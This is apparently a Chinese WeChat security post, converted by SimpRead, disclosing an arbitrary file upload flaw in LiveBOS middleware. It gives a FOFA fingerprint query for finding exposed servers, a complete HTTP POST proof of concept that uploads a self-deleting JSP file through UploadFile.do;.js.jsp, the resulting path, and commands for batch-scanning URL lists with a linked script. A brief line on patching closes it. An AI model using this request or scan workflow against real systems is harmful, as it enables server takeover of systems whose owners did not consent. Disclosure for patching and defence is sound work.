<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n9UwRzfr-ezxvBSH2-XvIA)

**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**

**fofa**

```
icon_hash="-417091401"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBnHf4d45OibQsjosmH5huqM0Q6xcC7XCDAXFgUTNBEEKAUyHAl9vnjGw/640?wx_fmt=png&from=appmsg)

**资产页面**

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBicicgstjqgVXNjrUibPsJibXctY7N6NTUHsUJVDBcFDmPSpVnuDDgE7UbQ/640?wx_fmt=png&from=appmsg)

**一、漏洞简述**

LiveBOS（简称 LiveBOS）是顶点软件股份有限公司开发的一个对象型业务架构中间件及其集成开发工具。它以业务模型建立为中心，直接完成软件开发的创新软件开发模式。适合于各类基于 WEB 的专业应用软件与行业大型应用的开发。由三个相对独立的产品构成：运行支持支撑平台 LiveBOS Server；开发集成环境 LiveBOS Studio 以及运维管理工具 LiveBOS Manager。其接口 UploadFile.do;.js.jsp 存在任意文件上传漏洞，攻击者可通过该漏洞获取系统服务器权限，从而控制该系统

****二、漏洞检测 poc****

```
POST /feed/UploadFile.do;.js.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Content-Type: multipart/form-data; boundary=---------------------------11d2c49c8ddda2a65a0a90c3b02189a3
Content-Length: 343
-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3
Content-Disposition: form-data; 
Content-Type: image/png
<% out.println("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
-----------------------------11d2c49c8ddda2a65a0a90c3b02189a3

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBcfUN5LxlYsHQFMpB6eEBy3ib4iadSzLoWe6mLdkNmxngL4FjicXicXgerw/640?wx_fmt=png&from=appmsg)

```
/tmptest.jsp;.js.jsp

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBhv4WcaGcSbvh9MQdz9vFeibkMxibE2moia4KpeNK4KicIcaZ8ASYKv4FMA/640?wx_fmt=png&from=appmsg)

****三、漏洞检测脚本****

****安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：****

https://github.com/ATonysan/poc-exp/blob/main/LiveBos_UploadFile_ArbiraryFileUpload.py

批量检测:

python LiveBos_UploadFile_ArbiraryFileUpload.py -f url.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBJxawpfVYwABn3jGEbFibrAbgjaGJY4PIW7dACKZfQ5U3vmQJicGESbTg/640?wx_fmt=png&from=appmsg)

单个 url 检测漏洞:

python LiveBos_UploadFile_ArbiraryFileUpload.py -u url

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgxk2FbmuN7tDrB1DKca2ZVBj25zgib9MyHY2jQu0885hYQuiaCZaO7mRokNJQLaYXRyE7OMxCUrpVlw/640?wx_fmt=png&from=appmsg)

**四、修复**

官方已更新补丁，请升级至最新版本。

官网地址：https://www.livebos.com/